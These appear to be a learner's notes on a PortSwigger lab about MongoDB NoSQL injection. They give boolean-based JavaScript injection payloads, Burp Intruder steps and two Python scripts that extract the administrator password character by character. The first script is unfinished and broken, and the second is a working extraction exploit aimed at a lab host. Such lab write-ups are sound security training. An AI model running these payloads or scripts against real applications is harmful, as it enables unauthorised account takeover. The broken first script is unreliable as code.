The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, extract the password for the `administrator` user, then log in to their account.

You can log in to your own account using the following credentials: `wiener:peter`.

_Tip: the password only uses lowercase letters._

---

Goal: Extract the password for the `administrator` user, then log in to their account.

Login post request:

![[IMG/Pasted image 20240919112731.png]]

`csrf=X1U2BcHazmR2IMhHbe6dqh6WUsxgR2mL&username=administrator&password=test`

- In Burp, go to **Proxy > HTTP history**. Right-click the `GET /user/lookup?user=wiener` request and select **Send to Repeater**.
    
- In Repeater, submit a `'` character in the user parameter. Notice that this causes an error. This may indicate that the user input was not filtered or sanitized correctly.
    
- Submit a valid JavaScript payload in the `user` parameter. For example, you could use `wiener'+'`
    
    Make sure to URL-encode the payload by highlighting it and using the hotkey `Ctrl-U`. Notice that it retrieves the account details for the `wiener` user, which indicates that a form of server-side injection may be occurring.
    
- Identify whether you can inject boolean conditions to change the response:
    
    1. Submit a false condition in the `user` parameter. For example: `wiener' && '1'=='2`
        
        Make sure to URL-encode the payload. Notice that it retrieves the message `Could not find user`.
        
    2. Submit a true condition in the user parameter. For example: `wiener' && '1'=='1`
        
        Make sure to URL-encode the payload. Notice that it no longer causes an error. Instead, it retrieves the account details for the `wiener` user. This demonstrates that you can trigger different responses for true and false conditions

- Identify the password length:
    
    1. Change the user parameter to `administrator' && this.password.length < 30 || 'a'=='b`, then send the request.
        
        Make sure to URL-encode the payload. Notice that the response retrieves the account details for the `administrator` user. This indicates that the condition is true because the password is less than 30 characters.
        
    2. Reduce the password length in the payload, then resend the request.
    3. Continue to try different lengths.
    4. Notice that when you submit the value `9`, you retrieve the account details for the `administrator` user, but when you submit the value `8`, you receive an error message because the condition is false. This indicates that the password is 8 characters long.

- In Intruder, enumerate the password:
    
    1. Change the user parameter to `administrator' && this.password[§0§]=='§a§`. This includes two payload positions. Make sure to URL-encode the payload.
    2. Set the attack type to **Cluster bomb**.
    3. In the **Payloads** tab, make sure that **Payload set 1** is selected, then add numbers from 0 to 7 for each character of the password.
    4. Select **Payload set 2**, then add lowercase letters from a to z. If you're using Burp Suite Professional, you can use the built-in `a-z` list.
    5. Click **Start attack**.
    6. Sort the attack results by **Payload 1**, then **Length**. Notice that one request for each character position (0 to 7) has evaluated to true and retrieved the details for the `administrator` user. Note the letters from the **Payload 2** column down.






---

Script details

pass length 8

32/126

payload:

```php
administrator' && this.password[§0§]=='§a§
```

Post /login

needs session and csrf token.

Unfinished
```php
#!/usr/bin/python3

import urllib3
import sys
import requests
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'https': 'http://127.0.0.1:8080', 'http': 'http://127.0.0.1:8080'}


def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def get_pass(s, url):
	pass_extracted = ''
	# CSRF
	csrf = get_csrf(s,url)
	# pass length
	for i in range(1,9):
	# ascii table
		for j in range(32,126):
			payload = "administrator' && this.password[%s]=='%s" %(i,j)
			#csrf = 
			
			sqli_payload_encoded = urllib.parse.quote(payload)
			
			r = s.get(url, verify=False, proxies=proxies)
	
			
			if '200' in r.text:
				password_extracted += chr(j)
				sys.stdout.write('\r' + password_extracted)
				sys.stdout.flush()
				break # Break out of the for loop and move to the next
	
			else:
				sys.stdout.write('\r' + password_extracted + chr(j))
				sys.stdout.flush()


def main():
	if len(sys.argv) != 2:
		print("[+] Usage: %s <URL>" % sys.argv[0])
		print("[+] Example: %s www.example.com/" % sys.argv[0])
		sys.exit(-1)
		
	url = sys.argv[1]
	s = requests.Session()
	print("[+] Trying to get password...")
	get_pass(s, url)

if __name__ == '__main__':
	main()
	
```



```python
import requests
from bs4 import BeautifulSoup
from string import ascii_letters

class Exploit:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.session = requests.Session()

    def getCSRFToken(self):
        print('[*] Fetching the CSRF token...')
        global LOGIN_ENDPOINT
        LOGIN_ENDPOINT = '/login'
        csrfTokenRespond = self.session.get(f'{self.baseUrl}{LOGIN_ENDPOINT}')
        
        soup = BeautifulSoup(csrfTokenRespond.text, 'html.parser')
        csrfToken = soup.find('input', {'name':'csrf'}).get('value')
        sessionCookie = self.session.cookies.get_dict()['session']
        print(f'[+] Fetched the CSRF token: {csrfToken}')
        print(f'[+] Session cookie: {sessionCookie}')
        return csrfToken

    def login(self):
        csrfToken = self.getCSRFToken()
        username = 'wiener'
        password = 'peter'
        loginData = {
            'csrf': csrfToken,
            'username': username,
            'password': password
        }
        print('[*] Logging in to the web application...')
        loginRespond = self.session.post(f'{self.baseUrl}{LOGIN_ENDPOINT}', data=loginData)
        if loginRespond.status_code == 400:
            print('[-] Login failed... Maybe the CSRF token is incorrect?')
            print(f'[-] Response text:\n{loginRespond.text}')
            exit(1)
        print('[+] Login successfully!')

    def extractData(self):
        USER_LOOKUP_ENDPOINT = '/user/lookup'
        USER_LOOK_PARAMETER = 'user'
        TARGET_USERNAME = 'administrator'
        LAST_CHARACTER = ascii_letters[-1]
        print(f'[*] Extracting {TARGET_USERNAME}\'s password...')
        password = ''
        stringPosition = 0
        while True:
            for character in ascii_letters:
                print(f'[*] Trying character "{character}"...', end='\r')
                payload = requests.utils.quote(f"{TARGET_USERNAME}' && this.password[{stringPosition}] == '{character}' || 'a'=='b")
                userLookupRespond = self.session.get(f'{self.baseUrl}{USER_LOOKUP_ENDPOINT}?{USER_LOOK_PARAMETER}={payload}')
                userLookupRespondJson = userLookupRespond.json()
                isLastCharacter = character == LAST_CHARACTER
                if 'message' in userLookupRespondJson:
                    if isLastCharacter:
                        print('[-] Looped all possible characters, no luck. Maybe we found all the password characters?')
                        print(f'[*] Password: {password}')
                        exit(1)
                    continue
                stringPosition += 1
                password += character
                print(f'[+] Found correct character "{character}". Current password: {password}')
                break

if __name__ == '__main__':
    baseUrl = 'https://0ade00e60326fdd58cade324003900c8.web-security-academy.net'
    exploit = Exploit(baseUrl)

    exploit.login()
    exploit.extractData()

```